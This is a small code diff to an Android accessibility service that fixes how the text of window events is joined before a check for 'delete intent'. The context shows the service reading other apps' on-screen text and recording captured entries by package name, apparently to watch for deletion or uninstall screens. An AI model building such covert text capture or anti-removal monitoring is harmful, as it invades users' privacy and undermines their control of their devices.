@@ -39,7 +39,9 @@ public class MiraAccessibilityService extends AccessibilityService {
             }
 
             if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
-                if (text_contains_delete_intent(event.getText().toString())) {
+                StringBuilder sb = new StringBuilder();
+                for (CharSequence cs : event.getText()) { if (cs != null) sb.append(cs); }
+                if (text_contains_delete_intent(sb.toString())) {
                     Log.d(TAG, "Delete intent detected in: " + packageName);
                     synchronized (capturedTexts) {
                         capturedTexts.add(0, "INTENT:delete|||" + packageName
